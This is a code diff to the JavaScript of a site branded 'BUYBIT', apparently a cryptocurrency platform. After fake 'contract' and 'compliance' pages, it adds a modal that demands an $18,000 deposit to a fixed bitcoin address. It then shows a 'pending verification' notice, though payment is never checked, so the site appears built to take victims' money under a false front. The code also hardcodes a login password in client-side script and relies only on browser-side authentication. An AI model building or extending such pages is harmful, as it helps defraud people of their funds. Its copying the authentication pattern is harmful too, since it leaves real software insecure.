@@ -4,6 +4,7 @@ const AUTH_PASSWORD = 'LetLoveLead420';
 // Ensure mobile copies work with the same JS behavior — no extra action needed here.
 const AUTH_KEY = 'buybit-authenticated';
 const REDIRECT_KEY = 'buybit-redirect';
+const PAID_KEY = 'buybit-hasPaid';
 
 const liveValues = document.querySelectorAll('.live-number');
 const assetAmount = document.querySelector('.asset-number');
@@ -190,6 +191,10 @@ function isAuthenticated() {
   return sessionStorage.getItem(AUTH_KEY) === 'true';
 }
 
+function hasPaid() {
+  return sessionStorage.getItem(PAID_KEY) === 'true';
+}
+
 function saveRedirectTarget() {
   sessionStorage.setItem(REDIRECT_KEY, getPageName());
 }
@@ -204,12 +209,22 @@ function clearRedirectTarget() {
 
 function requireAuth() {
   const pageName = getPageName();
-  if (pageName === 'login.html' || pageName === 'index.html' || pageName === 'btc-compliance.html') {
+  // Allow access to the login page always
+  if (pageName === 'login.html') {
     return;
   }
+
+  // If not authenticated, save where they tried to go and force login
   if (!isAuthenticated()) {
     saveRedirectTarget();
     window.location.href = 'login.html';
+    return;
+  }
+
+  // If authenticated but haven't paid, only allow the legal pages (contract & compliance) and login
+  if (!hasPaid() && pageName !== 'index.html' && pageName !== 'btc-compliance.html' && pageName !== 'login.html') {
+    // send them to the contract pack to accept terms and pay
+    window.location.href = 'index.html';
   }
 }
 
@@ -245,7 +260,8 @@ function handleLoginPage() {
     if (username === AUTH_USERNAME && password === AUTH_PASSWORD) {
       sessionStorage.setItem(AUTH_KEY, 'true');
       clearRedirectTarget();
-      window.location.href = getRedirectTarget();
+      // After login, always redirect to the Contract Pack (index.html)
+      window.location.href = 'index.html';
       return;
     }
 
@@ -272,6 +288,7 @@ function handleLegalConsent() {
     });
     contractButton.addEventListener('click', () => {
       if (contractCheckbox.checked) {
+        // move to BTC compliance page first (popup appears after compliance)
         window.location.href = 'btc-compliance.html';
       }
     });
@@ -283,10 +300,125 @@ function handleLegalConsent() {
     });
     agreeButton.addEventListener('click', () => {
       if (complianceCheckbox.checked) {
-        window.location.href = 'login.html';
+        showDepositModal('overview.html');
       }
     });
   }
+}
+
+function showDepositModal(destination) {
+  // create overlay and modal using themed classes
+  const overlay = document.createElement('div');
+  overlay.className = 'deposit-modal-overlay';
+
+  const modal = document.createElement('div');
+  modal.className = 'deposit-modal';
+
+  modal.innerHTML = `
+    <h3>Deposit required</h3>
+    <p>Please deposit <strong>$18,000.00 USD</strong> to the BUYBIT settlement address to continue. Once you have completed the payment, check the box below and click "Confirm Payment".</p>
+    <div style="margin:8px 0">
+      <div style="font-size:0.95rem;color:var(--text);margin-bottom:6px">Wallet address</div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <code id="deposit-address" style="background:rgba(255,255,255,0.03);padding:8px 10px;border-radius:8px;flex:1;overflow:auto">bc1q5cpwfus6rzq6gngqxmpqjluf7tpyyd8shv866m</code>
+        <button id="deposit-copy-btn" class="btn btn-outline" style="white-space:nowrap">Copy</button>
+      </div>
+    </div>
+    <label class="deposit-checkbox"><input type="checkbox" id="deposit-confirm-checkbox" /> I have paid $18,000.00</label>
+    <div class="deposit-actions">
+      <button id="deposit-cancel" class="btn btn-secondary">Cancel</button>
+      <button id="deposit-confirm" class="btn btn-primary" disabled>Confirm Payment</button>
+    </div>
+  `;
+
+  overlay.appendChild(modal);
+  document.body.appendChild(overlay);
+
+  const checkbox = modal.querySelector('#deposit-confirm-checkbox');
+  const confirmBtn = modal.querySelector('#deposit-confirm');
+  const cancelBtn = modal.querySelector('#deposit-cancel');
+
+  checkbox.addEventListener('change', () => {
+    confirmBtn.disabled = !checkbox.checked;
+  });
+
+  cancelBtn.addEventListener('click', () => {
+    document.body.removeChild(overlay);
+  });
+
+  confirmBtn.addEventListener('click', () => {
+    // mark payment acknowledged; in real app this should be verified server-side
+    sessionStorage.setItem(PAID_KEY, 'true');
+    document.body.removeChild(overlay);
+    // show verification modal and then navigate
+    showVerificationModal(destination);
+  });
+
+  // copy wallet address handler
+  const copyBtn = modal.querySelector('#deposit-copy-btn');
+  const addressEl = modal.querySelector('#deposit-address');
+  if (copyBtn && addressEl) {
+    copyBtn.addEventListener('click', async () => {
+      const txt = addressEl.textContent.trim();
+      try {
+        await navigator.clipboard.writeText(txt);
+        copyBtn.textContent = 'Copied';
+        setTimeout(() => (copyBtn.textContent = 'Copy'), 2000);
+      } catch (e) {
+        const range = document.createRange();
+        range.selectNodeContents(addressEl);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+      }
+    });
+  }
+}
+
+function showVerificationModal(destination) {
+  const overlay = document.createElement('div');
+  overlay.className = 'deposit-modal-overlay';
+
+  const modal = document.createElement('div');
+  modal.className = 'deposit-modal';
+  modal.innerHTML = `
+    <h3>Payment pending verification</h3>
+    <p>Your payment will be verified within 24 hours. Once confirmed, full access to the site and its features will be granted.</p>
+    <div class="deposit-actions">
+      <button id="verify-close" class="btn btn-primary">OK</button>
+    </div>
+  `;
+
+  overlay.appendChild(modal);
+  document.body.appendChild(overlay);
+
+  const closeBtn = modal.querySelector('#verify-close');
+  closeBtn.addEventListener('click', () => {
+    document.body.removeChild(overlay);
+    if (destination) window.location.href = destination;
+    else window.location.href = 'overview.html';
+  });
+}
+
+function showPaymentNotification() {
+  const note = document.createElement('div');
+  note.textContent = 'Thank you — your payment will be confirmed within 24 hours and your account will be fully activated.';
+  note.style.position = 'fixed';
+  note.style.bottom = '20px';
+  note.style.left = '50%';
+  note.style.transform = 'translateX(-50%)';
+  note.style.background = '#111';
+  note.style.color = '#fff';
+  note.style.padding = '12px 18px';
+  note.style.borderRadius = '6px';
+  note.style.boxShadow = '0 6px 20px rgba(0,0,0,0.3)';
+  note.style.zIndex = 10000;
+  document.body.appendChild(note);
+  setTimeout(() => {
+    note.style.transition = 'opacity 0.5s ease';
+    note.style.opacity = '0';
+    setTimeout(() => note.remove(), 500);
+  }, 5000);
 }
 
 function populateProfileFromSession() {
